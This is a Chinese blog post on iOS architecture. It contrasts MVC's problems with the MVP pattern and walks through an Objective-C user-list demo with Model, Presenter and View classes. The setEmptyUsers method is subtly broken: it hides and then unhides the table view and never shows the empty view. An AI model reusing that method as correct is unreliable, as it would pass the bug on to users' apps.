前言\n    \n软件开发中，最常见的设计模式是`Model-View-Controller`(MVC)，`MVC`也是构建`Cocoa`应用程序的标准模板，`MVC`设计模式为应用程序中的对象分配三个角色之一：模型，视图或控制器。采用这种模式的好处很多，这些应用程序中的许多对象往往更具可重用性，比其他应用程序更容易扩展。`Apple`对于`Cocoa`的MVC框架各角色之间的关系定义如下：\n![AppleMVC.png](https://upload-images.jianshu.io/upload_images/4881420-bd095c1fb37245b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n但随着时间的推移，开发的业务不断增多，`MVC`暴露出了越来越多的问题，随之而衍生出`MVP`、`MVVM`、`VIPER`等更高级架构。本文会先总结`MVC`在iOS应用开发中的存在的问题，再对`MVP`设计模式进行客观性描述。\n\n### MVC架构的缺陷\n\n1. 厚重的Controller难以维护。\n    \n   `Controller` 层是app的中枢机构，协调模型和视图之间的所有交互,其不仅管理所拥有的视图的视图层次结构，还要响应视图的用户交互操作等等，同时往往也会充满`Model`层模型逻辑以及`View`层业务逻辑等等的“胶水代码”。 厚重的Controller 正是由于大量的代码被放进 `UIViewController`，导致他们变的相当臃肿，一个 `UIViewController`里的代码成千上万行的事并不是前所未见的。\n\n    对于厚重的`Controller`，由于其庞大的规模往往很难维护；包含几十个属性，使他们的状态难以管理；遵循许多协议，导致协议的响应代码和`Controller`的逻辑代码混淆在一起。行业中对这种控制器有个专业词汇`Massive ViewControler`（臃肿的视图控制器）。\n\n2. Model层过于单薄。\n    \n    我们通常会在`Model`层定义数据成员属性，由于无需再手动管理释放变量，Model层既没有对象的构造，也没有复杂的业务处理，`implementation`基本上都是空的。然而根据 [Apple MVC](https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html) \n文档的描述，`Model`应包括操作和处理该数据的逻辑和计算，其业务逻辑不应被拖入到`Controller`。\n> Model objects encapsulate the data specific to an application and define the logic and computation that manipulate and process that data. ...\n\n3. 较差的可测试性。\n\n    这一点一方面是因为`Cocoa`框架里的`Controller`层，就是我们最熟悉的`UIViewController`和`UIView`是天然耦合的，很多`UIView`的生命周期方法都存在于`UIViewController`，另一方面我们很多时候也习惯于把UI操作甚至初始化操作放在`UIViewController`里，导致UI和业务逻辑混杂在一起。当你想对业务逻辑编写单元测试的时候，分离这些成分的单元测试成了一个艰巨的任务，因此大多数人选择忽略这个任务，那就是不做任何测试。\n  \n`Controller` 和 `View` 很难做到相互独立。虽然你可以把控制器里的一些业务逻辑和数据转换的工作交给 `Model`，但是你再想把负担往 `View` 里面分摊的时候就没办法了；因为 `View` 的主要职责就只是将用户的操作行为交给 `Controller` 去处理而已。于是 `ViewController` 最终就变成了所有东西的代理和数据源，甚至还负责网络请求的发起和取消。MVC的架构变成了:\n\n![Real MVC](http://upload-images.jianshu.io/upload_images/4881420-bc70b3b7d1110bff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n### MVC的优化方案之MVP\n`Model-View-Presenter`(MVP)是`MVC`体系结构模式的一种变体，其主要目的是将放在`Controller`里面的业务逻辑抽离出来，让`UIViewController`和`UIView`整合成`View`层，只负责页面布局和交互相关功能，从而减轻`UIViewController`的负担，并有利于对业务逻辑功能进行单元测试。\n\n* Model层：数据层，或者负责处理数据的 [数据接口层](https://en.wikipedia.org/wiki/Data_access_layer)。比如 *Person* 和 *PersonDataProvider* 类\n* View层：展示层(GUI)。对于 iOS 来说所有以 UI 开头的类基本都属于这层。\n* Presenter层：作为中间人，协调其他层之间的逻辑。一般来说，当用户对 View 有操作时它负责去修改相应 Model；当 Model 的值发生变化时它负责去更新对应 View。\n\nMVP在1996年就已经被提出，发展到现在已经出现好多变种，这里提供一种目前比较多人使用的规范：\n* `View`层是由`UIViewController`和`UIView`共同组成；\n* `View`层将委托`Presenter`层对它自己的操作；\n* `Presenter`层拥有对`View`层交互的逻辑；\n* `Presenter`层跟`Model`层通信，并将数据转化成对适应UI的数据并更新`View`；\n* `Presenter`不需要依赖`UIKit`；\n* `View`层是单一，因为它是被动接受命令，没有主动能力。\n\n根据以上规范，不同层级关系图如下：\n\n![MVP](http://upload-images.jianshu.io/upload_images/4881420-db4bbe124003f207.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n### MVP带来的便利\n* 职责划分清晰 — 业务逻辑划分到Presenter和Model，View只负责页面交互，从而降低耦合度。\n* 可测性强 — 基于一个功能简单的View层，可以测试大多数业务逻辑。\n* 复用性 — Presenter和View之间通过抽象方法交互，同样的业务逻辑可以很方便复用。\n\n### MVP的缺点\n由于对视图的渲染放在了Presenter中，所以视图和Presenter的交互会过于频繁。还有一点需要明白，如果Presenter过多地渲染了视图，往往会使得它与特定的视图的联系过于紧密。一旦视图需要变更，那么Presenter也需要变更了\n\n### 在iOS工程中使用MVP架构\n接下来会用一个简单的例子说明在iOS实际开发中如何使用`MVP`进行设计。例子是一个模拟获取用户数据显示到列表的demo。下面是详细设计过程：\n\n* **Model层**\n\n首先定义用户信息的`Model`；\n```\n@interface User : NSObject\n\n@property (nonatomic, strong) NSString *firstName;\n@property (nonatomic, strong) NSString *lastName;\n@property (nonatomic, strong) NSString *email;\n@property (nonatomic, assign) int age;\n\n// 类方法构造对象\n+ (User *)userWithFirstName:(NSString *)firstName \n                   lastName:(NSString *)lastName \n                      email:(NSString *)email \n                        age:(int)age;\n\n@end\n```\n另外定义一个`Service`，专门负责数据处理，在这里模拟请求返回数据；\n```\n\n@implementation UserService\n\n- (void)getUsers:(void(^)(NSArray<User *> *users))handler {\n    User *user1 = [User userWithFirstName:@\"First1\" lastName:@\"Last1\" email:@\"Iyad@test.com\" age:36];\n    User *user2 = [User userWithFirstName:@\"First2\" lastName:@\"Last2\" email:@\"Mila@test.com\" age:24];\n    \n    // 模拟网络请求耗时\n    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{\n        handler(@[user1, user2]);\n    });\n}\n\n@end\n\n```\n\n* **Presenter层**\n\n首先创建一个能让`View`直接使用的数据模型，其包含`View`需要的所有信息。\n```\n@interface UserViewData : NSObject\n\n@property (nonatomic, strong) NSString *name;\n@property (nonatomic, strong) NSString *age;\n\n@end\n```\n接下来是`View`的抽象方法，`Presenter`可以不用知道是哪个`ViewController`，就可以直接调用其方法，在这里使用`protocol`方法；\n\n```\n@protocol UserView <NSObject> \n\n- (void)startLoading;\n- (void)finishLoading;\n- (void)setUsers:(NSArray<UserViewData *> *)users;\n- (void)setEmptyUsers;\n\n@end\n\n```\n协议中的方法会在`View`中实现，`Presenter`会调用这些方法来更新界面。\n\n```\n@interface UserPresenter() \n\n@property (nonatomic, strong) UserService *userService;\n@property (nonatomic, weak) id<UserView> userView;\n\n@end\n\n@implementation UserPresenter \n\n- (instancetype)initWithUserService:(UserService *)userService {\n    if (self = [super init]) {\n        self.userService = userService;\n    }\n    return self;\n}\n\n- (void)attachView:(id<UserView>)view {\n    _userView = view;\n}\n\n- (void)detachView {\n    _userView = nil;\n}\n\n- (void)getUsers {\n    [_userView startLoading];\n    __weak typeof(self) weakSelf = self;\n    [_userService getUsers:^(NSArray<User *> *users){\n        [weakSelf.userView finishLoading];\n        if (users.count == 0) {\n            [weakSelf.userView setEmptyUsers];\n        } else {\n            NSMutableArray *userArray = [NSMutableArray array];\n            for(User *user in users) {\n                UserViewData *userData = [[UserViewData alloc] init];\n                userData.name = [NSString stringWithFormat:@\"%@ %@\", user.firstName, user.lastName];\n                userData.age = [NSString stringWithFormat:@\"%d years\", user.age];\n                [userArray addObject:userData];\n            }\n            [weakSelf.userView setUsers:userArray];\n        }\n    }];\n}\n\n@end\n```\n\nPresenter通过`attachView:`方法绑定视图，并实现业务逻辑，在数据更新时调用协议方法更新界面；Presenter内还包含关于User数据模型转换成视图能用的`UserViewData`格式的工作。\n\n* **View层**\n\n`View`持有`Presenter`对象，实现`Presenter`页面交互协议方法，并在初始化时绑定到，用户交互时调用`Presenter`更新数据；\n```\n@interface ViewController()<UITableViewDataSource, UserView>\n\n@property (weak, nonatomic) IBOutlet UIView *emptyView;\n@property (weak, nonatomic) IBOutlet UITableView *tableView;\n@property (weak, nonatomic) IBOutlet UIActivityIndicatorView *activityIndicator;\n\n@property (nonatomic, strong) UserPresenter *userPresenter;\n@property (nonatomic, strong) NSArray *usersToDisplay;\n\n@end\n\n@implementation ViewController\n\n#pragma mark - life cycles\n- (void)viewDidLoad {\n    [super viewDidLoad];\n    \n    _tableView.dataSource = self;\n    _activityIndicator.hidesWhenStopped = YES;\n    \n    // 绑定视图\n    [self.userPresenter attachView:self];\n    // 获取用户数据\n    [self.userPresenter getUsers];\n}\n\n#pragma mark - UserView\n- (void)startLoading {\n    [_activityIndicator startAnimating];\n}\n\n- (void)finishLoading {\n    [_activityIndicator stopAnimating];\n}\n\n- (void)setUsers:(NSArray<UserViewData *> *)users {\n    _usersToDisplay = users;\n    _tableView.hidden = NO;\n    _emptyView.hidden = YES;\n    [_tableView reloadData];\n}\n\n- (void)setEmptyUsers {\n    _tableView.hidden = YES;\n    _tableView.hidden = NO;\n}\n\n#pragma mark - UITableViewDataSource\n- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {\n    return self.usersToDisplay.count;\n}\n\n- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {\n    UITableViewCell *cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:@\"UserCell\"];\n    UserViewData *user = [self.usersToDisplay objectAtIndex:indexPath.row];\n    cell.textLabel.text = user.name;\n    cell.detailTextLabel.text = user.age;\n    return cell;\n}\n\n#pragma mark - getters and setters\n- (UserPresenter *)userPresenter {\n    if (_userPresenter == nil) {\n        UserService *userService = [[UserService alloc] init];\n        _userPresenter = [[UserPresenter alloc] initWithUserService:userService];\n    }\n    return _userPresenter;\n}\n\n- (NSArray *)usersToDisplay {\n    if (_usersToDisplay == nil) {\n        _usersToDisplay = [NSArray array];\n    } \n    return _usersToDisplay;\n}\n\n@end\n```\n","tags":["Technology"]}]